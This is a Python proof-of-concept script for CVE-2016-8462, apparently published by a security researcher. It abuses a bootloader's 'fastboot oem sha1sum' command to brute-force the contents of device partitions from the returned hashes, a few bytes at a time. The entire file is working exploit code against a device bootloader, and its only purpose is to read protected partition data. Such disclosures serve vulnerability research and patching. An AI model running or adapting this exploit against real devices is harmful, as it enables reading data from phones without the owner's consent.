#
# PoC for CVE-2016-8462
# Roee Hay (@roeehay)
#

import os
import sys
import subprocess
import hashlib
import re
import struct

FASTBOOT_SHA1SUM = "fastboot oem sha1sum %s %d %d"

def main():
    
    
    if len(sys.argv) < 2:
        print "usage: %s <partition_name> [size] [offset]" % sys.argv[0]
        return 1
     
    offset = 0
    size = 1000
    
    if len(sys.argv) > 2:
        size = int(sys.argv[2])
        
    if len(sys.argv) > 3:
        offset = int(sys.argv[3])
    
    
    if 0 != offset:
        data = break_trailing_zeros(offset, size)
        if None != data:
            dump_cand(data[:size], offset)
            return
        
        
    size = size + offset
    while offset < size:
        x , next_offset = break_least_bytes(offset)
        dump_cand(x, offset)
        offset = next_offset
        
        

def break_trailing_zeros(offset, size):
    if size < offset:
        s = offset
    else:
        s = size
        
    return break_bytes(s, offset, 0xff**size)
    
        
# break the least amount of bytes needed for the given offset

def break_least_bytes(offset):
    if 0 == offset:
        return (break_bytes(1, 0), offset+1)

    start_offset = 1 + (offset / 2)
    data = break_bytes(start_offset, start_offset)

    if None == data:
        raise Exception("cannot break")
        
    next_offset = start_offset  * 2
    
    return (data[offset - start_offset : ], next_offset)
    
def break_bytes(size, offset, attempts=0):
        remote_digest =  get_remote_sha1(sys.argv[1], size, offset)
        D(("> " + FASTBOOT_SHA1SUM + " = %s (%d bytes)\n") % (sys.argv[1], offset, size, remote_digest, size))
        cand = [0] *  size
        i = 0
        while None != cand:
            cand_digest = hashlib.sha1(cand_bytes(cand)).hexdigest()
            if remote_digest == cand_digest:
                return cand
            
            i+=1
            
            if attempts != 0 and i >= attempts:
                break
                
            cand = next_cand(cand)

def get_remote_sha1(partition, size, offset):
    output = system(FASTBOOT_SHA1SUM % (partition, offset, size))
    return re.search(r"\(bootloader\) (\w{40})", output, re.DOTALL).group(1)
    

def bruteforce(size):
        pass
    
def next_cand(cand):
    i = 0
    while i < len(cand):
        if cand[i] != 0xFF:
            break
        
        cand[i] = 0
        i += 1
        
    if len(cand) == i:
        return None
        
    cand[i] = cand[i] + 1
    return cand
 
def cand_bytes(cand):
    return struct.pack("%dB" % len(cand), *cand)
    
def system(cmd):
    return subprocess.check_output(cmd, stderr=subprocess.STDOUT)

def dump_cand(cand, offset):
    for i in xrange(len(cand)):
        D("%08x: %02x %s\n" % (offset+i, cand[i], struct.pack("B", cand[i])))

    
def D(s):
    sys.stdout.write("\r")
    sys.stdout.write(" " * 120)
    sys.stdout.write("\r" + s)
    
sys.exit(main())
